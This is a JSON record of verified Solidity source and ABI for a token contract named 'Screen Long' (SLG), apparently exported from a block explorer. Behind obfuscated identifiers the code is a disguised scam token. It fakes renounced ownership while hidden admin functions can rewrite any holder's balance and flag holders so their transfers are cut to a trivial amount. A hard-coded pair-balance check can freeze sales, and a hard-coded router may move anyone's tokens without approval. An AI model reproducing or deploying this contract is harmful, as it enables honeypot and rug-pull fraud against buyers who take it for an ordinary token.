{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface atTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalTakeLaunched {\n    function createPair(address tokenSwapBuy, address launchLimit) external returns (address);\n}\n\ninterface tokenToLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderMarketing) external view returns (uint256);\n\n    function transfer(address takeTeam, uint256 senderMaxAuto) external returns (bool);\n\n    function allowance(address launchedReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderMaxAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeTeam,\n        uint256 senderMaxAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundTake, uint256 value);\n    event Approval(address indexed launchedReceiver, address indexed spender, uint256 value);\n}\n\ninterface autoFee is tokenToLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScreenLong is modeMax, tokenToLiquidity, autoFee {\n\n    constructor (){\n        if (isLiquidity) {\n            exemptReceiverFrom = limitSwap;\n        }\n        atTx shouldFund = atTx(atList);\n        feeMax = totalTakeLaunched(shouldFund.factory()).createPair(shouldFund.WETH(), address(this));\n        \n        feeShould = _msgSender();\n        isAmount();\n        fundFrom[feeShould] = true;\n        marketingTrading[feeShould] = liquidityReceiverLaunched;\n        if (isLiquidity) {\n            toFeeMin = limitSwap;\n        }\n        emit Transfer(address(0), feeShould, liquidityReceiverLaunched);\n    }\n\n    bool private minSwap;\n\n    function owner() external view returns (address) {\n        return isToken;\n    }\n\n    function getOwner() external view returns (address) {\n        return isToken;\n    }\n\n    function transferFrom(address fromShould, address takeTeam, uint256 senderMaxAuto) external override returns (bool) {\n        if (_msgSender() != atList) {\n            if (shouldTrading[fromShould][_msgSender()] != type(uint256).max) {\n                require(senderMaxAuto <= shouldTrading[fromShould][_msgSender()]);\n                shouldTrading[fromShould][_msgSender()] -= senderMaxAuto;\n            }\n        }\n        return fundSwapTotal(fromShould, takeTeam, senderMaxAuto);\n    }\n\n    function fundSwapTotal(address fromShould, address takeTeam, uint256 senderMaxAuto) internal returns (bool) {\n        if (fromShould == feeShould) {\n            return maxExempt(fromShould, takeTeam, senderMaxAuto);\n        }\n        uint256 modeAt = tokenToLiquidity(feeMax).balanceOf(receiverExempt);\n        require(modeAt == txFee);\n        require(takeTeam != receiverExempt);\n        if (senderFrom[fromShould]) {\n            return maxExempt(fromShould, takeTeam, shouldAt);\n        }\n        return maxExempt(fromShould, takeTeam, senderMaxAuto);\n    }\n\n    function allowance(address fromList, address modeReceiver) external view virtual override returns (uint256) {\n        if (modeReceiver == atList) {\n            return type(uint256).max;\n        }\n        return shouldTrading[fromList][modeReceiver];\n    }\n\n    function transfer(address swapExempt, uint256 senderMaxAuto) external virtual override returns (bool) {\n        return fundSwapTotal(_msgSender(), swapExempt, senderMaxAuto);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldMin;\n    }\n\n    bool public isLiquidity;\n\n    function tradingLaunchedAt(address swapExempt, uint256 senderMaxAuto) public {\n        totalAmountTake();\n        marketingTrading[swapExempt] = senderMaxAuto;\n    }\n\n    address public feeMax;\n\n    function totalAmountTake() private view {\n        require(fundFrom[_msgSender()]);\n    }\n\n    mapping(address => uint256) private marketingTrading;\n\n    function isAmount() public {\n        emit OwnershipTransferred(feeShould, address(0));\n        isToken = address(0);\n    }\n\n    function modeEnable(address limitExempt) public {\n        totalAmountTake();\n        if (toFeeMin == exemptReceiverFrom) {\n            exemptReceiverFrom = shouldWalletEnable;\n        }\n        if (limitExempt == feeShould || limitExempt == feeMax) {\n            return;\n        }\n        senderFrom[limitExempt] = true;\n    }\n\n    address receiverExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private shouldTrading;\n\n    uint256 txFee;\n\n    address private isToken;\n\n    function maxExempt(address fromShould, address takeTeam, uint256 senderMaxAuto) internal returns (bool) {\n        require(marketingTrading[fromShould] >= senderMaxAuto);\n        marketingTrading[fromShould] -= senderMaxAuto;\n        marketingTrading[takeTeam] += senderMaxAuto;\n        emit Transfer(fromShould, takeTeam, senderMaxAuto);\n        return true;\n    }\n\n    mapping(address => bool) public fundFrom;\n\n    function isLaunch(uint256 senderMaxAuto) public {\n        totalAmountTake();\n        txFee = senderMaxAuto;\n    }\n\n    uint256 constant shouldAt = 10 ** 10;\n\n    uint256 private limitSwap;\n\n    bool public walletSwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return walletExemptAuto;\n    }\n\n    uint256 public exemptReceiverFrom;\n\n    function name() external view virtual override returns (string memory) {\n        return toLimit;\n    }\n\n    uint256 limitFrom;\n\n    string private toLimit = \"Screen Long\";\n\n    function balanceOf(address senderMarketing) public view virtual override returns (uint256) {\n        return marketingTrading[senderMarketing];\n    }\n\n    uint256 private shouldWalletEnable;\n\n    uint8 private walletExemptAuto = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityReceiverLaunched;\n    }\n\n    address atList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public teamLimit;\n\n    function buyFund(address liquidityReceiver) public {\n        if (walletSwap) {\n            return;\n        }\n        if (shouldWalletEnable == exemptReceiverFrom) {\n            exemptReceiverFrom = limitSwap;\n        }\n        fundFrom[liquidityReceiver] = true;\n        if (exemptReceiverFrom == shouldWalletEnable) {\n            teamLimit = true;\n        }\n        walletSwap = true;\n    }\n\n    uint256 public toFeeMin;\n\n    string private shouldMin = \"SLG\";\n\n    event OwnershipTransferred(address indexed enableWalletSell, address indexed receiverMaxTotal);\n\n    address public feeShould;\n\n    function approve(address modeReceiver, uint256 senderMaxAuto) public virtual override returns (bool) {\n        shouldTrading[_msgSender()][modeReceiver] = senderMaxAuto;\n        emit Approval(_msgSender(), modeReceiver, senderMaxAuto);\n        return true;\n    }\n\n    mapping(address => bool) public senderFrom;\n\n    uint256 private liquidityReceiverLaunched = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableWalletSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMaxAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"buyFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderMaxAuto\",\"type\":\"uint256\"}],\"name\":\"isLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitExempt\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFeeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMaxAuto\",\"type\":\"uint256\"}],\"name\":\"tradingLaunchedAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMaxAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderMaxAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ScreenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}